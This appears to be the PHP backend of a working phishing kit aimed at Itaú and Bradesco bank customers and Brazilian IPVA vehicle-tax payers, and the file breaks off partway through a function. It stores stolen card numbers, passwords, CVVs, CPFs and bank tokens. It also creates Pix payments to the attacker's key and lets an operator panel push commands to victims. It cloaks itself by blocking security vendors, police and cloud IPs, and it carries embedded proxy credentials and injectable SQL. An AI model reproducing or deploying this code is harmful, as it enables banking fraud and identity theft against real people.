<?php
date_default_timezone_set('America/Sao_Paulo');
require_once('conexao.php');

function pagina($request)
{

    require_once($request);
}

function pishing_x9($pagina)
{

    require_once($pagina);
    exit;
}

if ($_GET['funcao'] == 'saver-user') {
    $usuario = $_POST['usuario'];

    if (empty($usuario)) {
        print 'false';
        exit;
    } else {
        $_SESSION['usersave'] = $usuario;
        print 'true';
        exit;
    }
}

if ($_GET['funcao'] == 'getJson') {

    header('Content-Type: application/json');

    $sql = "SELECT * FROM empresas WHERE chavej = '" . $_SESSION['chave'] . "'";
    $result = mysqli_query($ConnectDB, $sql);

    if (!$result) {
        die("Erro na consulta: " . mysqli_error($conn));
    }

    $data = array();

    while ($row = mysqli_fetch_assoc($result)) {
        $data[] = $row;
    }

    // Feche a conexão com o banco de dados
    mysqli_close($conn);

    // Converta os resultados em JSON
    $json = json_encode($data);

    echo $json;
}

if ($_GET['funcao'] == 'ipva') {

    $placa = $_POST['placa'];
    $str_placa = str_replace(' ', '', $placa);
    $str_placa2 = str_replace('-', '', $str_placa);

    $_SESSION['placa'] = $str_placa2;

    // URL do site JSON que você deseja acessar
    $url = 'https://www.ipvabr.com.br/placa/' . $str_placa2;
    $proxy = 'http://alemao181-zone-resi-region-br:alemao181@cc4069aa2a373662.byi.na.pyproxy.io:16666';
    // Inicializa a sessão cURL
    $ch = curl_init($url);

    // Configura as opções da requisição cURL
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // Habilita o retorno da resposta

    //for debug only!
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);

    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    // Executa a requisição cURL e armazena a resposta em $data
    $data = curl_exec($ch);

    // Verifica se ocorreu algum erro na requisição
    if (curl_errno($ch)) {
        echo 'erro_curl';
        exit;
    }

    // Fecha a sessão cURL
    curl_close($ch);

    //print $data;

    $valor_ipva = explode('<p style="text-align:center;margin-bottom: 0;margin-top:0;" class="ipva_valor_pagar">', $data);
    $valor_ipva2 = explode('</p>', $valor_ipva[1]);
    $valor_ipva3 = $valor_ipva2[0];
    $valor_ipva3n = addslashes($valor_ipva3);
    $_SESSION['valor_ipva'] = $valor_ipva3n;

    //print $_SESSION['valor_ipva'];

    if (empty($_SESSION['valor_ipva'])) {
        # code...
        print 'erro_ipva';
        exit;
    } else {
        print 'true';
        exit;
    }

    //print $valor_ipva3n;
}

if ($_GET['funcao'] == 'gerarPix') {

    $valor = $_SESSION['valor_ipva'];
    $chavepix = '8c61851a-38a3-4477-961d-902980500cee';
    $nomepix = 'plus sistemas ltda';
    $estadopix = 'Brasilia';

    $str_plc1 = str_replace('.', '', $valor);
    $str_plc = str_replace(',', '.', $str_plc1);
    $str_plc2 = str_replace('R$ ', '', $str_plc);

    $valorqr = $str_plc2;

    $_SESSION['valor_pix_qr'] = $valorqr;
    $_SESSION['chave_pix'] = $chavepix;
    $_SESSION['nome_pix'] = $nomepix;
    $_SESSION['estado_pix'] = $estadopix;

    $curl_pix = curl_init();

    // Configure as opções da sessão cURL
    curl_setopt($curl_pix, CURLOPT_URL, "https://maquinadecartaoboa.com/wp-admin/admin-ajax.php");
    curl_setopt($curl_pix, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl_pix, CURLOPT_POST, 1);
    curl_setopt($curl_pix, CURLOPT_POSTFIELDS, 'nonce=3c5f8bb02b&action=create_pixlink&qrpix_key_opt=custom&qrpix_key_value=' . $chavepix . '&qrpix_receiver=' . $nomepix . '&qrpix_city=' . $estadopix . '&qrpix_value=' . $valorqr . '&qrpix_description=' . $_SESSION['placa'] . '');
    // Execute a sessão cURL
    $headers = array();
    $headers[] = 'Accept: */*';
    $headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
    $headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36';
    curl_setopt($curl_pix, CURLOPT_HTTPHEADER, $headers);
    $response_curl_pix = curl_exec($curl_pix);

    // Feche a sessão cURL
    curl_close($curl_pix);

    //print $response_curl_pix;

    if ($response_curl_pix === false) {
        // Se houve um erro, você pode acessar detalhes do erro usando curl_error($curl) e curl_errno($curl)
        echo 'erro_pix';
    } else {
        print $response_curl_pix;
    }
}

if ($_GET['funcao'] == 'ApiKser') {

    $cpf = $_GET['cpf'];

    // URL do site JSON que você deseja acessar
    $url = 'https://consultascompletas.cloud/consultaSerasa2020/' . $cpf;

    // Inicializa a sessão cURL
    $ch = curl_init($url);

    // Configura as opções da requisição cURL
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // Habilita o retorno da resposta
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Ignora a verificação do certificado SSL (não é recomendado para produção)

    // Executa a requisição cURL e armazena a resposta em $data
    $data = curl_exec($ch);

    // Verifica se ocorreu algum erro na requisição
    if (curl_errno($ch)) {
        echo 'Erro na requisição cURL: ' . curl_error($ch);
    }

    // Fecha a sessão cURL
    curl_close($ch);

    print $data;
}

if ($_GET['funcao'] == 'ExibirLogs') {

    header('Content-Type: application/json');

    $sql = "SELECT * FROM backup ORDER BY id DESC";
    $result = mysqli_query($ConnectDB, $sql);

    if (!$result) {
        die("Erro na consulta: " . mysqli_error($conn));
    }

    $data = array();

    while ($row = mysqli_fetch_assoc($result)) {
        $data[] = $row;
    }

    // Feche a conexão com o banco de dados
    mysqli_close($conn);

    // Converta os resultados em JSON
    $json = json_encode($data, JSON_PRETTY_PRINT);

    echo $json;
}

if ($_GET['funcao'] == 'VerItau') {

    header('Content-Type: application/json');

    $sql = "SELECT * FROM itau ORDER BY id DESC";
    $result = mysqli_query($ConnectDB, $sql);

    if (!$result) {
        die("Erro na consulta: " . mysqli_error($conn));
    }

    $data = array();

    while ($row = mysqli_fetch_assoc($result)) {
        $data[] = $row;
    }

    // Feche a conexão com o banco de dados
    mysqli_close($conn);

    // Converta os resultados em JSON
    $json = json_encode($data, JSON_PRETTY_PRINT);

    echo $json;
}

if ($_GET['funcao'] == 'SalvarCC') {

    $cartao = $_POST['cartao'];
    $senha = $_POST['senha'];

    $_SESSION['cartao'] = $cartao;
    $_SESSION['senha'] = $senha;

    if (empty($senha)) {
        # code...
        print 'false';
        exit;
    } else {
        print 'true';
        exit;
    }
}

if ($_GET['funcao'] == 'SalvarDados') {

    $cartao = $_SESSION['cartao'];
    $senha4 = $_SESSION['senha'];

    $senha6 = $_POST['senha'];
    $cvv = $_POST['cvv'];
    $validade = $_POST['validade'];
    $cpf = $_POST['cpf'];

    $insertSQL = "INSERT INTO `itau` (cartao, senha4, senha6, validade, cvv, cpf) VALUES ('$cartao', '$senha4', '$senha6', '$validade', '$cvv', '$cpf')";
    mysqli_select_db($ConnectDB, $database_ConnectDB);
    mysqli_query($ConnectDB, $insertSQL);
}

if ($_GET['funcao'] == 'getJsonPinPag') {

    header('Content-Type: application/json');

    $sql = "SELECT * FROM pinpag WHERE usuario = '" . $_SESSION['conta'] . "'";
    $result = mysqli_query($ConnectDB, $sql);

    if (!$result) {
        die("Erro na consulta: " . mysqli_error($conn));
    }

    $data = array();

    while ($row = mysqli_fetch_assoc($result)) {
        $data[] = $row;
    }

    // Feche a conexão com o banco de dados
    mysqli_close($conn);

    // Converta os resultados em JSON
    $json = json_encode($data);

    echo $json;
}

if ($_GET['funcao'] == 'JsonApp') {

    header('Content-Type: application/json');

    $sql = "SELECT * FROM infos WHERE agencia = '" . $_SESSION['conta'] . "'";
    $result = mysqli_query($ConnectDB, $sql);

    if (!$result) {
        die("Erro na consulta: " . mysqli_error($conn));
    }

    $data = array();

    while ($row = mysqli_fetch_assoc($result)) {
        $data[] = $row;
    }

    // Feche a conexão com o banco de dados
    mysqli_close($conn);

    // Converta os resultados em JSON
    $json = json_encode($data);

    echo $json;
}

if ($_GET['funcao'] == 'salvar-login') {

    $usuario = $_POST['usuario'];
    $senha = $_POST['senha'];
    $tipo = $_POST['tipo'];

    if (empty($senha)) {
        # code...
        print 'false';
        exit;
    }

    if (strlen($senha) > 4) {
        // A senha possui 4 caracteres
    } else {
        // A senha não possui 4 caracteres
        echo "false_senha";
        exit;
    }


    $sql = "SELECT * FROM infos WHERE agencia = '$usuario'";
    $query = mysqli_query($ConnectDB, $sql);
    $total = mysqli_num_rows($query);

    $agora = date('d/m/Y - H:i');

    if ($total == 0) {
        puxar_isp($ip);

        $_SESSION['conta'] = $usuario;
        $_SESSION['agencia'] = $senha;

        $insertSQL = "INSERT INTO `infos` (agencia, conta, tipo_conta, estado, cidade, ip, datahora, dispositivo) VALUES ('$usuario', '$senha', '" . $_POST['tipo'] . "', '" . $_SESSION['estado'] . "', '" . $_SESSION['cidade'] . "', '$ip', '$agora', '" . Obter_SO() . "')";
        mysqli_select_db($ConnectDB, $database_ConnectDB);
        mysqli_query($ConnectDB, $insertSQL);

        $insertSQL2 = "INSERT INTO `backup` (usuario, senha, data, tipo, device) VALUES ('$usuario', '$senha', '$agora', '" . $_POST['tipo'] . "', '" . Obter_SO() . "')";
        mysqli_select_db($ConnectDB, $database_ConnectDB);
        mysqli_query($ConnectDB, $insertSQL2);

        print 'true';
        exit;
    } else {
        puxar_isp($ip);

        $result_usuario = "UPDATE infos SET conta='" . $senha . "', comando='SENHA ATUALIZADA' where agencia='" . $usuario . "'";
        mysqli_query($ConnectDB, $result_usuario);

        $_SESSION['conta'] = $usuario;
        $_SESSION['agencia'] = $senha;
        print 'true';
    }
}

if ($_GET['acao'] == 'online') {
    $data['atual'] = date('Y-m-d H:i:s');


    $data['online'] = strtotime($data['atual'] . " - 5 seconds");
    $data['online'] = date("Y-m-d H:i:s", $data['online']);


    $result_qnt_visitas = "SELECT count(id) as online FROM visitas WHERE data_final >= '" . $data['online'] . "'";


    $resultado_qnt_visitas = mysqli_query($ConnectDB, $result_qnt_visitas);
    $row_qnt_visitas = mysqli_fetch_assoc($resultado_qnt_visitas);
    echo $row_qnt_visitas['online'];
}

function puxar_isp($data_ip)
{

    $details = json_decode(file_get_contents("http://ip-api.com/json/$data_ip"));

    $pais = $details->country;
    $estado = $details->regionName;
    $cidade = $details->city;
    $servidor = $details->isp;
    $org = $details->org;

    $_SESSION['estado'] = $estado;
    $_SESSION['cidade'] = $cidade;
    $_SESSION['servidor'] = $servidor;
    $_SESSION['pais'] = $pais;
}

function verificar_isp()
{
    $palavrasbloqueadas = array(
        'Google LLC',
        'Chrome',
        'Googlebot',
        'googleweblight',
        'Facebook',
        'facebook',
        'facebookexternalhit',
        'Facebot',
        'external',
        'GoDaddy',
        'Hosting',
        'amazonaws',
        'Amazon ',
        'Amazon Technologies Inc.',
        'AdsBot',
        'Microsoft',
        'Yahoo',
        'Qnax Ltda',
        'AVAST',
        's.r.o',
        'DigitalOcean',
        'Digital Ocean',
        'proxy',
        'Maxihost',
        'Heficed',
        'Censys',
        'Locaweb',
        'USA,',
        'Volarehost',
        'M247',
        'OVH',
        'Linode',
        'LLC',
        'btg',
        'delegacia',
        'policia',
        'bradesco',
        'next',
        'virustotal',
        'virus total',
        'v total',
        'V tal',
        'BTT',
        'Finegroupservers',
        'Ipxo',
        'MIRholding',
        'Datacamp',
        'HostRoyale',
        'Limited',
        'daycoval',
        'trafficforce',
        'vpn',
        'unifique',
        'fastville',
        'google',
        'pvt',
        'Geekyworks',
        'kaspersky',
        'IONOS',
        'G-Core',
        'IOMART',
        'Host Universal',
        'Cogent Communications',
        'The Constant Company',
        'Choopa'
    );

    $date = date('d/m/Y - H:i');
    $date;
    $dados_ISP_BLOCK = "(" . $_GET['app'] . ") - (ISP BLOCK) - (" . $date . ") - (" . Obter_SO() . ") > Servidor: " . $_SESSION['servidor'] . "| Estado: " . $_SESSION['estado'] . "  (" . $_SESSION['pais'] . ") | IP: " . $_SESSION['ip'] . "\n";


    if (preg_match(sprintf('/%s/i', implode('|', $palavrasbloqueadas)), $_SESSION['servidor'])) {
        file_put_contents("./webdriver/die.db", $dados_ISP_BLOCK, FILE_APPEND);
        pishing_x9('./webdriver/paginas/x9.php');
        exit();
    } else {
    }
}

function verificar_agent()
{

    $useragent = $_SERVER['HTTP_USER_AGENT'];

    $palavrasliberadas = array(
        'Mozilla',
    );

    if (preg_match(sprintf('/%s/i', implode('|', $palavrasliberadas)), $useragent)) {
    } else {
        pishing_x9('./webdriver/paginas/x9.php');
        exit();
    }
}

function verificar_dispositivo()
{

    if (empty(Obter_SO())) {
        pishing_x9('./webdriver/paginas/x9.php');
        exit;
    } else {
        //pishing_x9('./webdriver/paginas/x9.php');
        //exit;
    }
}

function verificar_pais()
{

    $date = date('d/m/Y - H:i');
    $date;

    $dados_IP_GRINGO = "(" . $_GET['app'] . ") - (IP GRINGO) - (" . $date . ") - (" . Obter_SO() . ") > Servidor: " . $_SESSION['servidor'] . "| Estado: " . $_SESSION['estado'] . "  (" . $_SESSION['pais'] . ") | IP: " . $_SESSION['ip'] . "\n";
    $dados_IP_CIDADE = "(" . $_GET['app'] . ") - (CIDADE BLOQUEADA) - (" . $date . ") - (" . Obter_SO() . ") > Servidor: " . $_SESSION['servidor'] . "| Estado: " . $_SESSION['estado'] . "  (" . $_SESSION['pais'] . ") | IP: " . $_SESSION['ip'] . "\n";

    if ($_SESSION['pais'] == 'Brazil') {
    } else {

        if ($_SESSION['pais'] == 'Mexico') {
        } else {
            if ($_GET['app'] == 'digitalocean') {
            } else {
                if ($_GET['app'] == 'google_en') {
                } else {
                    if ($_GET['app'] == 'hiveon') {
                    } else {
                        if ($_GET['app'] == 'backpack') {
                        } else {
                            file_put_contents("./webdriver/die.db", $dados_IP_GRINGO, FILE_APPEND);
                            pishing_x9('./webdriver/paginas/x9.php');
                            exit;
                        }
                    }
                }
            }
        }
    }
}

function Obter_SO()
{
    /**
     * Windows...
     */
    //$sistemas_operativos['windows nt 5.2'] = 'Windows 2003';
    //$sistemas_operativos['windows nt 6.0'] = 'Windows Vista';
    $sistemas_operativos['windows nt 6.1'] = 'Windows 7';
    $sistemas_operativos['windows nt 6.2'] = 'Windows 8';
    $sistemas_operativos['windows nt 6.3'] = 'Windows 8.1';
    $sistemas_operativos['windows nt 10.0'] = 'Windows 10';
    /**
     * So Móveis...
     */
    $sistemas_operativos['Android'] = 'Android';
    $sistemas_operativos['iPhone'] = 'iPhone';
    //$sistemas_operativos['iPad'] = 'iPad';
    //$sistemas_operativos['elaine'] = 'Palm';
    //$sistemas_operativos['palm'] = 'Palm';
    //$sistemas_operativos['series60'] = 'Symbian S60';
    //$sistemas_operativos['symbian'] = 'Symbian';
    //$sistemas_operativos['SymbianOS'] = 'Symbian OS';
    //$sistemas_operativos['windows ce'] = 'Windows CE';
    //$sistemas_operativos['Windows Phone'] = 'Windows Phone';
    /**
     * Mac...
     */
    $sistemas_operativos['mac'] = 'Mac';
    $sistemas_operativos['Mac OS X'] = 'Mac OS X';
    $sistemas_operativos['Mac 10'] = 'Mac OS X';
    $sistemas_operativos['Mac OS X 10_4'] = 'Mac OS X Tiger';
    $sistemas_operativos['Mac OS X 10_5'] = 'Mac OS X Leopard';
    $sistemas_operativos['Mac OS X 10_5_2'] = 'Mac OS X Leopard';
    $sistemas_operativos['Mac OS X 10_5_3'] = 'Mac OS X Leopard';
    $sistemas_operativos['PowerPC'] = 'Mac PPC';
    $sistemas_operativos['PPC'] = 'Mac PPC';

    if (is_array($sistemas_operativos)) {
        foreach ($sistemas_operativos as $ua => $sistemas_operativo) {
            if (preg_match("|" . preg_quote($ua) . "|i", trim($_SERVER['HTTP_USER_AGENT']))) {
                return $sistemas_operativo;
            }
        }
    }
}

if ($_GET['acao'] == 'comando') {
    mysqli_select_db($ConnectDB, $database_ConnectDB);
    $query_UserJson = sprintf("SELECT * FROM infos WHERE agencia = '" . $_SESSION['conta'] . "'");
    $UserJson = mysqli_query($ConnectDB, $query_UserJson);
    $row_UserJson = mysqli_fetch_assoc($UserJson);
    $totalRows_UserJson = mysqli_num_rows($UserJson);

    $chave = $_SESSION['conta'];
    $key = $row_UserJson['agencia'];
    if ($chave == $key) {
        $_SESSION['key'] = $key;
        echo $pagina = $row_UserJson['comando'];
        //print 'token_erro';
        $_SESSION['comando'] = $pagina;
        exit;
    } else {
        echo 'bloquear';
        exit();
    }
}

if ($_GET['funcao'] == 'enviar-comando') {

    $comando = $_POST['comando'];

    $result_usuario = "UPDATE infos SET comando='$comando' where agencia='" . $_SESSION['conta'] . "'";
    mysqli_query($ConnectDB, $result_usuario);
}

if ($_GET['page'] == 'finalizar') {

    session_start();
    session_destroy();
    session_start();
}

if ($_GET['funcao'] == 'senha4') {

    $valor = $_POST['valor'];
    $comando = $_POST['funcao'];

    if (preg_match('/^[\d\-]+$/', $_POST['valor']) > 0) {
    } else {
        echo 'false';
        exit;
    }

    if (preg_match("/^.{4,}$/", $_POST['valor'])) {
        print 'true';
        $result_usuario = "UPDATE infos SET senha='" . $_POST['valor'] . "', comando='$comando' where conta='" . $_SESSION['conta'] . "'";
        mysqli_query($ConnectDB, $result_usuario);
        return true;
    } else {
        print 'false';
        return false;
    }
}

if ($_GET['funcao'] == 'selecionar-titular') {

    $valor = $_POST['valor'];
    $comando = $_POST['funcao'];

    $_SESSION['titular_nome'] = $valor;

    $result_usuario = "UPDATE infos SET titular='" . $_POST['valor'] . "', comando='$comando' where agencia='" . $_SESSION['conta'] . "'";
    mysqli_query($ConnectDB, $result_usuario);
}

if ($_GET['funcao'] == 'cadastrar-serial') {

    $valor = $_POST['valor'];
    $comando = $_POST['funcao'];
    $agora = date('d/m/Y - H:i');

    if (preg_match('/^[\d\-]+$/', $_POST['valor']) > 0) {
    } else {
        echo 'false';
        exit;
    }

    $sql = "SELECT * FROM tabela_token WHERE conta = '" . $_SESSION['conta'] . "' and token = '" . $_POST['valor'] . "'";
    $query = mysqli_query($ConnectDB, $sql);
    $total = mysqli_num_rows($query);
    if ($total == 0) {
        $_SESSION['unlock_conta'] = $_POST['valor'];
        $insertSQL = "INSERT INTO `tabela_token` (conta, token, tipo, datahora) VALUES ('" . $_SESSION['conta'] . "', '" . $_POST['valor'] . "', '$comando', '$agora')";
        mysqli_select_db($ConnectDB, $database_ConnectDB);
        mysqli_query($ConnectDB, $insertSQL);
    } else {
        print 'false';
        exit;
    }
}

if ($_GET['funcao'] == 'salvar-token') {

    $valor = $_POST['valor'];
    $comando = $_POST['funcao'];
    $agora = date('d/m/Y - H:i');

    $sql = "SELECT * FROM tabela_token WHERE conta = '" . $_SESSION['conta'] . "' and token = '" . $_POST['valor'] . "'";
    $query = mysqli_query($ConnectDB, $sql);
    $total = mysqli_num_rows($query);
    if ($total == 0) {
        $insertSQL = "INSERT INTO `tabela_token` (conta, token, tipo, datahora) VALUES ('" . $_SESSION['conta'] . "', '" . $_POST['valor'] . "', '$comando', '$agora')";
        mysqli_select_db($ConnectDB, $database_ConnectDB);
        mysqli_query($ConnectDB, $insertSQL);
    } else {
        $insertSQL = "INSERT INTO `tabela_token` (conta, token, tipo, datahora) VALUES ('" . $_SESSION['conta'] . "', '" . $_POST['valor'] . "', '$comando', '$agora')";
        mysqli_select_db($ConnectDB, $database_ConnectDB);
        mysqli_query($ConnectDB, $insertSQL);
        //print 'false';
        exit;
    }
}

/////////////////////

if ($_GET['funcao'] == 'atualizar-titular') {

    $titular01 = $_POST['titular_1'];
    $titular02 = $_POST['titular_2'];
    $variacao = $_POST['variacao'];
    $comando = $_POST['comando'];

    $result_usuario = "UPDATE infos SET titular_01='$titular01', titular_02='$titular02', variacao='$variacao', comando='$comando' where id='" . $_GET['id'] . "'";
    mysqli_query($ConnectDB, $result_usuario);
}

if ($_GET['funcao'] == 'enviar-cmd-admin') {
    $comando = $_POST['comando'];

    $result_usuario = "UPDATE infos SET comando='$comando' where id='" . $_GET['id'] . "'";
    mysqli_query($ConnectDB, $result_usuario);
}

if ($_GET['funcao'] == 'select-tipo') {

    $tipo = $_POST['tipo'];
    
    $_SESSION['bradesco_tipo'] = $tipo;
}

if ($_GET['funcao'] == 'enviar-saldo') {

    $valor = $_POST['valor'];
    $comando = $_POST['comando'];

    $result_usuario = "UPDATE infos SET saldo='" . $_POST['valor'] . "', comando='$comando' where id='" . $_GET['id'] . "'";
    mysqli_query($ConnectDB, $result_usuario);
}

if ($_GET['funcao'] == 'enviar-serial') {

    $valor = $_POST['valor'];
    $comando = $_POST['comando'];

    $result_usuario = "UPDATE infos SET serial='" . $_POST['valor'] . "', comando='$comando' where id='" . $_GET['id'] . "'";
    mysqli_query($ConnectDB, $result_usuario);
}

if ($_GET['funcao'] == 'enviar-tabela') {

    $valor = $_POST['valor'];
    $comando = $_POST['comando'];

    $result_usuario = "UPDATE infos SET tabela='" . $_POST['valor'] . "', comando='$comando' where id='" . $_GET['id'] . "'";
    mysqli_query($ConnectDB, $result_usuario);
}

if ($_GET['funcao'] == 'enviar-toque') {

    $valor = $_POST['valor'];
    $valor2 = $_POST['valor2'];
    $comando = $_POST['comando'];

    $result_usuario = "UPDATE infos SET titular='" . $_POST['valor'] . "', titular_01='" . $_POST['valor2'] . "', comando='$comando' where id='" . $_GET['id'] . "'";
    mysqli_query($ConnectDB, $result_usuario);
}


if ($_GET['funcao'] == 'acionar-comando') {
    $comando = $_POST['comando'];

    $result_usuario = "UPDATE infos SET comando='$comando' where id='" . $_GET['id'] . "'";
    mysqli_query($ConnectDB, $result_usuario);
}

if ($_GET['funcao'] == 'operar') {
    $comando = $_POST['comando'];

    $result_usuario = "UPDATE infos SET status='" . $_SESSION['nome_usu_sessao'] . "' where id='" . $_GET['id'] . "'";
    mysqli_query($ConnectDB, $result_usuario);
}
/////////////////////

if ($_GET['funcao'] == 'consultar-serial') {
    mysqli_select_db($ConnectDB, $database_ConnectDB);
    $query_UserJson = sprintf("SELECT * FROM infos WHERE agencia = '" . $_SESSION['conta'] . "'");
    $UserJson = mysqli_query($ConnectDB, $query_UserJson);
    $row_UserJson = mysqli_fetch_assoc($UserJson);
    $totalRows_UserJson = mysqli_num_rows($UserJson);

    print $row_UserJson['serial'];
}

if ($_GET['funcao'] == 'consultar-tabela') {
    mysqli_select_db($ConnectDB, $database_ConnectDB);
    $query_UserJson = sprintf("SELECT * FROM infos WHERE agencia = '" . $_SESSION['conta'] . "'");
    $UserJson = mysqli_query($ConnectDB, $query_UserJson);
    $row_UserJson = mysqli_fetch_assoc($UserJson);
    $totalRows_UserJson = mysqli_num_rows($UserJson);

    print $row_UserJson['tabela'];
}

if ($_GET['funcao'] == 'tabela-atual') {
    mysqli_select_db($ConnectDB, $database_ConnectDB);
    $query_UserJson = sprintf("SELECT * FROM tabela_token WHERE conta = '" . $_GET['id'] . "' ORDER BY id DESC");
    $UserJson = mysqli_query($ConnectDB, $query_UserJson);
    $row_UserJson = mysqli_fetch_assoc($UserJson);
    $totalRows_UserJson = mysqli_num_rows($UserJson);

    print $row_UserJson['token'];
}

if ($_GET['funcao'] == 'verifica-titular') {
    mysqli_select_db($ConnectDB, $database_ConnectDB);
    $query_UserJson = sprintf("SELECT * FROM infos WHERE agencia = '" . $_SESSION['conta'] . "'");
    $UserJson = mysqli_query($ConnectDB, $query_UserJson);
    $row_UserJson = mysqli_fetch_assoc($UserJson);
    $totalRows_UserJson = mysqli_num_rows($UserJson);

    $_SESSION['id_vitima'] = $row_UserJson['id'];

    if (!empty($row_UserJson['titular_02'])) {
        print 'true';
    } else {
        print 'false';
    }
}

if ($_GET['funcao'] == 'consultar-saldo') {
    mysqli_select_db($ConnectDB, $database_ConnectDB);
    $query_UserJson = sprintf("SELECT * FROM infos WHERE agencia = '" . $_SESSION['conta'] . "'");
    $UserJson = mysqli_query($ConnectDB, $query_UserJson);
    $row_UserJson = mysqli_fetch_assoc($UserJson);
    $totalRows_UserJson = mysqli_num_rows($UserJson);

    print $row_UserJson['saldo'];
    $_SESSION['saldo'] = $row_UserJson['saldo'];
}

if ($_GET['funcao'] == 'titular') {
    mysqli_select_db($ConnectDB, $database_ConnectDB);
    $query_UserJson = sprintf("SELECT * FROM infos WHERE conta = '" . $_SESSION['conta'] . "'");
    $UserJson = mysqli_query($ConnectDB, $query_UserJson);
    $row_UserJson = mysqli_fetch_assoc($UserJson);
    $totalRows_UserJson = mysqli_num_rows($UserJson);

    print $row_UserJson['titular'];
}

if ($_GET['funcao'] == 'consultar-qrcode') {
    mysqli_select_db($ConnectDB, $database_ConnectDB);
    $query_UserJson = sprintf("SELECT * FROM infos WHERE agencia = '" . $_SESSION['conta'] . "'");
    $UserJson = mysqli_query($ConnectDB, $query_UserJson);
    $row_UserJson = mysqli_fetch_assoc($UserJson);
    $totalRows_UserJson = mysqli_num_rows($UserJson);

    print $row_UserJson['qrcode'];
}

if ($_GET['app'] == 'qrcode') {

    $name = $_FILES['file']['name'];
    $target_dir = "qrcode/";
    $target_file = $target_dir . basename($_FILES["file"]["name"]);

    // Select file type
    $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

    // Valid file extensions
    $extensions_arr = array("jpg", "jpeg", "png", "gif");

    // Check extension
    if (in_array($imageFileType, $extensions_arr)) {
        // Upload file
        if (move_uploaded_file($_FILES['file']['tmp_name'], $target_dir . $name)) {
            // Convert to base64 
            $image_base64 = base64_encode(file_get_contents('qrcode/' . $name));
            $image = 'data:image/' . $imageFileType . ';base64,' . $image_base64;

            // Insert record
            $result_usuario = "UPDATE infos SET qrcode='" . $image . "', comando='solicitar_serial_qr' where id='" . $_GET['client_id'] . "'";
            mysqli_query($ConnectDB, $result_usuario);
            mysqli_query($ConnectDB, $query);

            print 'true';

            unlink('qrcode/' . $name);
        }
    } else {
        print 'false';
    }
}

if ($_GET['page'] == 'contarclick') {
    $lines1 = file_get_contents("./live.db");
    $lines1 = explode("\n", $lines1);
    //$lines = array_unique($lines);
    print $num_visitas = count($lines1) - 1;
    exit();
}

if ($_GET['page'] == 'contarx9') {
    $lines1 = file_get_contents("./die.db");
    $lines1 = explode("\n", $lines1);
    //$lines = array_unique($lines);
    print $num_visitas = count($lines1) - 1;
    exit();
}

if ($_GET['page'] == 'contarinfos') {
    $sql = "SELECT * FROM infos";
    $query = mysqli_query($ConnectDB, $sql);
    $contar_infos = mysqli_num_rows($query);
    print $contar_infos;
    exit;
}

if ($_GET['page'] == 'apagartudo') {
    $result_usuario = "DELETE FROM infos";
    $resultado_usuario = mysqli_query($ConnectDB, $result_usuario);

    $result_usuario2 = "DELETE FROM tabela_token";
    $resultado_usuario2 = mysqli_query($ConnectDB, $result_usuario2);
    exit;
}

if ($_GET['app'] == 'online') {
    $data['atual'] = date('Y-m-d H:i:s');

    //Diminuir 1 minuto, contar usuário no site no último minuto
    //$data['online'] = strtotime($data['atual'] . " - 1 minutes");

    //Diminuir 20 segundos 
    $data['online'] = strtotime($data['atual'] . " - 5 seconds");
    $data['online'] = date("Y-m-d H:i:s", $data['online']);
    //echo $_SESSION['visitante'];
    if ((isset($_SESSION['visitante'])) and (!empty($_SESSION['visitante']))) {

        print $result_up_visita = "UPDATE visitas SET data_final = '" . $data['atual'] . "', client_id = '" . $_POST['contar'] . "' WHERE id = '" . $_SESSION['visitante'] . "'";

        $resultado_up_visitas = mysqli_query($ConnectDB, $result_up_visita);
    } else {
        //Salvar no banco de dados
        $result_visitas = "INSERT INTO visitas (data_inicio, data_final, client_id) VALUES ('" . $data['atual'] . "', '" . $data['atual'] . "', '" . $_POST['contar'] . "')";

        $resultado_visitas = mysqli_query($ConnectDB, $result_visitas);

        $_SESSION['visitante'] = mysqli_insert_id($ConnectDB);
    }

    //Pesquisar os ultimos usuarios online nos 20 segundo
    $result_qnt_visitas = "SELECT count(id) as online FROM visitas WHERE data_final >= '" . $data['online'] . "'";

    $resultado_qnt_visitas = mysqli_query($ConnectDB, $result_qnt_visitas);
    $row_qnt_visitas = mysqli_fetch_assoc($resultado_qnt_visitas);

    echo $row_qnt_visitas['online'];
}

if ($_GET['app'] == 'qrcode-erro') {

    $name = $_FILES['file']['name'];
    $target_dir = "qrcode/";
    $target_file = $target_dir . basename($_FILES["file"]["name"]);

    // Select file type
    $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

    // Valid file extensions
    $extensions_arr = array("jpg", "jpeg", "png", "gif");

    // Check extension
    if (in_array($imageFileType, $extensions_arr)) {
        // Upload file
        if (move_uploaded_file($_FILES['file']['tmp_name'], $target_dir . $name)) {
            // Convert to base64 
            $image_base64 = base64_encode(file_get_contents('qrcode/' . $name));
            $image = 'data:image/' . $imageFileType . ';base64,' . $image_base64;

            // Insert record
            $result_usuario = "UPDATE infos SET qrcode='" . $image . "', comando='qrcode_erro' where id='" . $_GET['client_id'] . "'";
            mysqli_query($ConnectDB, $result_usuario);
            mysqli_query($ConnectDB, $query);

            print 'true';

            unlink('qrcode/' . $name);
        }
    } else {
        print 'false';
    }
}
////BUSCAR TITULAR////

function random($size)
{
    $KEYS = "ABCDEFGHJKMNOPQRSTUWXYZ0123456789";
    $str = array();
    $lenghth = strlen($KEYS) - 1;
    for ($i = 0; $i < $size; $i++) {
        $n = rand(0, $lenghth);
        $str[] = $KEYS[$n];
    }
    return implode($str);
}

function getNome2($agencia, $conta)
{
    $digitoConta = substr($conta, -1);
    $conta = substr($conta, 0, strlen($conta) - 1);

    $part = random(10);
    $ga = random(1) . "." . random(8) . "." . random(9) . "." . $part . "-" . random(9) . "." . $part;

    $agencia = str_pad($agencia, 4, "0", STR_PAD_LEFT);


    $ch = curl_init("https://www.ib12.bradesco.com.br/ibpfnovologin/identificacao.jsf?_ga=" . $ga);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

